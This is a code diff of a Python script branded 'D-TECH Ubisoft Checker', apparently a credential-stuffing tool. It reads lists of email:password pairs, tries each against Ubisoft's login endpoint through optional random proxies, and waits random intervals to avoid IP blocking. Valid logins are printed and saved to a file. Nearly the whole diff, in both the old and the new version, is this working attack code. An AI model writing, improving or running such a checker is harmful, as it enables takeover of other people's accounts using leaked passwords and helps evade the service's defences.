@@ -3,25 +3,117 @@ import base64
 import json
 import time
 import random
+import os
 import sys
+from colorama import init, Fore, Style
 
-# ANSI Colors for Display
-RESET = "\033[0m"
-RED = "\033[91m"
-GREEN = "\033[92m"
-YELLOW = "\033[93m"
-BLUE = "\033[94m"
-MAGENTA = "\033[95m"
-CYAN = "\033[96m"
-BOLD = "\033[1m"
+# Initialize Colorama
+init(autoreset=True)
 
 # D-TECH Banner
-print(f"""{CYAN}
-╔════════════════════════════════════════════╗
-║            {BOLD}🔥 D-TECH Ubisoft Checker 🔥{RESET}{CYAN}         ║
-║               made by {BOLD}preasx24{RESET}{CYAN}               ║
-╚════════════════════════════════════════════╝{RESET}
-""")
+def banner():
+    print(f"""{Fore.CYAN}{Style.BRIGHT}
+╔═════════════════════════════════════════╗
+║          🛡️ D-TECH Ubisoft Checker 🛡️       ║
+║            Made by Preasx24             ║
+╚═════════════════════════════════════════╝
+{Style.RESET_ALL}""")
+
+
+# User Input for File Paths with Validation
+def get_file_path(prompt, must_exist=True):
+    while True:
+        path = input(f"{Fore.YELLOW}📂 {prompt}: {Style.RESET_ALL}").strip()
+        if must_exist and not os.path.exists(path):
+            print(f"{Fore.RED}❌ [ERROR] File not found. Please try again.{Style.RESET_ALL}")
+        elif not must_exist:
+            return path
+        else:
+            return path
+
+
+# Load accounts from a file (Limit to first 20)
+def load_accounts(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            accounts = [line.strip().split(':') for line in file if ':' in line]
+        if not accounts:
+            print(f"{Fore.YELLOW}⚠️ [WARNING] No valid accounts found in the file.{Style.RESET_ALL}")
+            sys.exit()
+        limited_accounts = accounts[:20]  # Limit to the first 20 accounts
+        print(f"{Fore.BLUE}🔄 [INFO] Loaded {len(limited_accounts)} accounts (Limited to 20).{Style.RESET_ALL}")
+        return limited_accounts
+    except FileNotFoundError:
+        print(f"{Fore.RED}❌ [ERROR] Accounts file not found.{Style.RESET_ALL}")
+        sys.exit()
+
+
+# Save successful accounts
+def save_success(success_file, email, password):
+    try:
+        with open(success_file, 'a') as file:
+            file.write(f"{email}:{password}\n")
+        print(f"{Fore.GREEN}✅ [SAVED] {email}:{password} saved to {success_file}{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.RED}❌ [ERROR] Could not save account: {e}{Style.RESET_ALL}")
+
+
+# Display Progress Bar
+def progress_bar(current, total, bar_length=40):
+    percentage = current / total
+    arrow = f"{Fore.GREEN}█{Style.RESET_ALL}" * int(round(percentage * bar_length))
+    spaces = ' ' * (bar_length - len(arrow))
+    sys.stdout.write(f"\r[{arrow}{spaces}] {int(percentage * 100)}%")
+    sys.stdout.flush()
+
+
+# Check Ubisoft Account
+def check_account(email, password, success_file):
+    credentials = f"{email}:{password}"
+    encoded_credentials = base64.b64encode(credentials.encode()).decode()
+    data = {"rememberMe": True}
+    headers = HEADERS.copy()
+    headers["Authorization"] = f"Basic {encoded_credentials}"
+    
+    proxy = random.choice(PROXIES) if PROXIES else None
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    
+    try:
+        response = requests.post(LOGIN_URL, headers=headers, data=json.dumps(data), proxies=proxies)
+        if response.status_code == 200 and "platformType" in response.text:
+            print(f"\n{Fore.GREEN}✅ [SUCCESS] {email}:{password} - Valid Account{Style.RESET_ALL}")
+            save_success(success_file, email, password)
+        elif "Invalid credentials" in response.text:
+            print(f"\n{Fore.RED}❌ [INVALID] {email}:{password} - Invalid credentials{Style.RESET_ALL}")
+        else:
+            print(f"\n{Fore.YELLOW}⚠️ [ERROR] {email}:{password} - Unexpected response{Style.RESET_ALL}")
+    except requests.exceptions.RequestException as e:
+        print(f"\n{Fore.RED}❌ [ERROR] Network issue: {e}{Style.RESET_ALL}")
+
+
+# Main Execution
+def main():
+    banner()
+    
+    # User-Specified File Paths
+    accounts_file = get_file_path("Enter the path to your accounts file")
+    success_file = get_file_path("Enter the path to save valid accounts", must_exist=False)
+    
+    accounts = load_accounts(accounts_file)
+    total_accounts = len(accounts)
+    
+    print(f"\n{Fore.BLUE}🔄 [INFO] Starting to check {total_accounts} accounts...\n{Style.RESET_ALL}")
+    
+    for index, (email, password) in enumerate(accounts, start=1):
+        print(f"{Fore.CYAN}🛠️ [{index}/{total_accounts}] Checking {email}...{Style.RESET_ALL}")
+        progress_bar(index, total_accounts)
+        check_account(email, password, success_file)
+        
+        # Prevent IP blocking with delay
+        time.sleep(random.uniform(1.5, 4))
+    
+    print(f"\n{Fore.GREEN}🎯 [COMPLETED] Checked {total_accounts} accounts (Limited to 20).{Style.RESET_ALL}")
+
 
 # Settings
 HEADERS = {
@@ -39,104 +131,7 @@ HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
 }
 LOGIN_URL = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
-
-# Proxy Settings (Optional)
 PROXIES = []
-
-
-# Animated Typing Effect
-def slow_print(text, delay=0.03):
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()
-
-
-# Progress Bar
-def progress_bar(current, total, status):
-    bar_length = 30
-    progress = int((current / total) * bar_length)
-    bar = f"{GREEN}{'█' * progress}{RESET}{' ' * (bar_length - progress)}"
-    print(f"\r[{bar}] {current}/{total} - {status}", end='', flush=True)
-
-
-# Check Ubisoft Account
-def check_account(email, password):
-    credentials = f"{email}:{password}"
-    encoded_credentials = base64.b64encode(credentials.encode()).decode()
-    data = {"rememberMe": True}
-    headers = HEADERS.copy()
-    headers["Authorization"] = f"Basic {encoded_credentials}"
-    
-    proxy = random.choice(PROXIES) if PROXIES else None
-    proxies = {"http": proxy, "https": proxy} if proxy else None
-    
-    try:
-        response = requests.post(LOGIN_URL, headers=headers, data=json.dumps(data), proxies=proxies)
-        if response.status_code == 200 and "platformType" in response.text:
-            print(f"\n{GREEN}[SUCCESS]{RESET} {email}:{password} - Valid Account")
-            return True
-        elif "Invalid credentials" in response.text:
-            print(f"\n{RED}[INVALID]{RESET} {email}:{password} - Invalid credentials")
-            return False
-        else:
-            print(f"\n{YELLOW}[ERROR]{RESET} {email}:{password} - Unexpected response")
-            return False
-    except requests.exceptions.RequestException as e:
-        print(f"\n{RED}[ERROR]{RESET} Network issue: {e}")
-        return False
-
-
-# Main Execution
-def main():
-    slow_print(f"{YELLOW}[INFO]{RESET} Enter accounts in '{BOLD}email:password{RESET}' format, one per line.")
-    slow_print(f"{YELLOW}[INFO]{RESET} Type '{BOLD}done{RESET}' when you're finished.\n")
-    
-    accounts_input = []
-    while True:
-        line = input(f"{CYAN}> {RESET}").strip()
-        if line.lower() == 'done':
-            break
-        if ':' in line:
-            accounts_input.append(line.split(':'))
-        else:
-            print(f"{RED}[ERROR]{RESET} Invalid format. Use '{BOLD}email:password{RESET}'.")
-    
-    if len(accounts_input) > 20:
-        print(f"\n{YELLOW}[INFO]{RESET} You entered {len(accounts_input)} accounts. Only the first {BOLD}20{RESET} will be tested.\n")
-        accounts_input = accounts_input[:20]
-    else:
-        print(f"\n{YELLOW}[INFO]{RESET} Loaded {len(accounts_input)} accounts.\n")
-    
-    successful_accounts = []
-    
-    for index, (email, password) in enumerate(accounts_input, start=1):
-        status = f"Checking {email}"
-        progress_bar(index, len(accounts_input), status)
-        if check_account(email, password):
-            successful_accounts.append(f"{email}:{password}")
-        
-        # Prevent IP blocking with delay
-        delay = random.uniform(2, 5)
-        print(f"{MAGENTA}[DELAY]{RESET} Waiting for {BOLD}{delay:.2f} seconds{RESET}...\n")
-        time.sleep(delay)
-    
-    print(f"\n{BOLD}{CYAN}╔══════════════════════════════╗")
-    print(f"║       Process Completed       ║")
-    print(f"╚══════════════════════════════╝{RESET}")
-    
-    print(f"\n{BOLD}[SUMMARY]{RESET}")
-    print(f"{GREEN}✓ Successful Accounts: {len(successful_accounts)}{RESET}")
-    print(f"{RED}✗ Invalid/Failed Accounts: {len(accounts_input) - len(successful_accounts)}{RESET}\n")
-    
-    if successful_accounts:
-        print(f"{BOLD}{GREEN}[SUCCESSFUL ACCOUNTS]{RESET}")
-        for account in successful_accounts:
-            print(f"{CYAN}- {account}{RESET}")
-    else:
-        print(f"{YELLOW}[INFO] No valid accounts found.{RESET}")
-
 
 if __name__ == "__main__":
     main()
